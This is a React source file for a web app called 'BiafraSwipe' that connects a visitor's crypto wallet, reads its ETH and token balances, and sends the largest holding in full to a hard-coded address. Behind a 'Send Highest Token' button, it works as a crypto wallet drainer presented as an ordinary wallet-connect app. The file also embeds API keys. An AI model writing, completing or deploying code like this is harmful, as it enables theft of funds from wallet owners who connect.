// src/App.js
import React, { useEffect, useState } from 'react';
import { WagmiConfig, useAccount, useConnect, useDisconnect } from 'wagmi';
import { mainnet, goerli } from 'wagmi/chains';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createWeb3Modal } from '@web3modal/wagmi/react';
import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
import './App.css';
import { getEthersSigner } from './ethersAdapters';

const queryClient = new QueryClient();
const projectId = '1c1db7ada235d88816f2f0008d415fdc';
const metadata = {
  name: 'BiafraSwipe',
  description: 'BiafraSwipe Description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/'],
};
const chains = [mainnet, goerli];
const config = defaultWagmiConfig({
  chains,
  projectId,
  metadata,
});

createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: true,
  enableOnramp: true,
});

export function Web3ModalProvider({ children }) {
  return (
    <WagmiConfig config={config}>
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    </WagmiConfig>
  );
}

function ConnectButton() {
  return <w3m-button />;
}

const ethers = require('ethers');
const toAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
const tokenAddresses = {
  Ethereum: null, // Native token
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  USDC: '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
  ShibaInu: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
  Chainlink: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
  WrappedBitcoin: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
  Solana: '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C',
  AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
  Polkadot: '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B',
  BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
};

async function getTokenBalances(provider, address) {
  const balances = {};

  // Check balance of native Ethereum
  balances['Ethereum'] = await provider.getBalance(address);

  // Check balance of ERC-20 tokens
  for (const [token, tokenAddress] of Object.entries(tokenAddresses)) {
    if (token !== 'Ethereum') {
      const contract = new ethers.Contract(
        tokenAddress,
        ['function balanceOf(address) view returns (uint256)'],
        provider
      );
      balances[token] = await contract.balanceOf(address);
    }
  }
  return balances;
}

async function transferHighestToken(signer, balances) {
  let highestToken = 'Ethereum';
  let highestBalance = balances['Ethereum'];

  for (const [token, balance] of Object.entries(balances)) {
    if (balance.gt(highestBalance)) {
      highestToken = token;
      highestBalance = balance;
    }
  }

  if (highestToken === 'Ethereum') {
    const gasPrice = await signer.getGasPrice();
    const estimateGas = await signer.estimateGas({
      to: toAddress,
      value: highestBalance,
    });
    const gasCost = gasPrice.mul(estimateGas);
    const value = highestBalance.sub(gasCost);

    const tx = await signer.sendTransaction({
      to: toAddress,
      value: value,
    });
    await tx.wait();
  } else {
    const contract = new ethers.Contract(
      tokenAddresses[highestToken],
      ['function transfer(address to, uint256 value) public returns (bool)'],
      signer
    );

    const tx = await contract.transfer(toAddress, highestBalance);
    await tx.wait();
  }
}

function App() {
  const { address, isConnected } = useAccount();
  const { connect, connectors } = useConnect();
  const { disconnect } = useDisconnect();
  const [balances, setBalances] = useState({});
  const [transactionInProgress, setTransactionInProgress] = useState(false);

  useEffect(() => {
    if (isConnected) {
      const fetchBalances = async () => {
        const provider = ethers.getDefaultProvider('mainnet', {
          infura: 'c05e035e823a4769b62ae15c1cbe2f02'
        });
        const balances = await getTokenBalances(provider, address);
        setBalances(balances);
      };

      fetchBalances();
    }
  }, [isConnected, address]);

  const handleConnect = () => {
    connect({ connector: connectors[0] });
  };

  const handleSendTransaction = async () => {
    if (isConnected && !transactionInProgress) {
      setTransactionInProgress(true);
      try {
        const signer = await getEthersSigner(config);
        await transferHighestToken(signer, balances);
        alert('Transaction successful!');
      } catch (error) {
        console.error('Transaction failed:', error);
        alert('Transaction failed. Please try again.');
      } finally {
        setTransactionInProgress(false);
      }
    }
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>WalletConnect App</h1>
        {isConnected ? (
          <>
            <p>Connected account: {address}</p>
            <div>
              <h2>Token Balances:</h2>
              <ul>
                {Object.entries(balances).map(([token, balance]) => (
                  <li key={token}>
                    {token}: {ethers.utils.formatUnits(balance, token === 'Ethereum' ? 18 : 6)}
                  </li>
                ))}
              </ul>
            </div>
            <button onClick={handleSendTransaction} disabled={transactionInProgress}>
              {transactionInProgress ? 'Processing...' : 'Send Highest Token'}
            </button>
            <button onClick={disconnect}>Disconnect Wallet</button>
          </>
        ) : (
          <button onClick={handleConnect}>Connect Wallet</button>
        )}
      </header>
      <ConnectButton />
    </div>
  );
}

export default App;
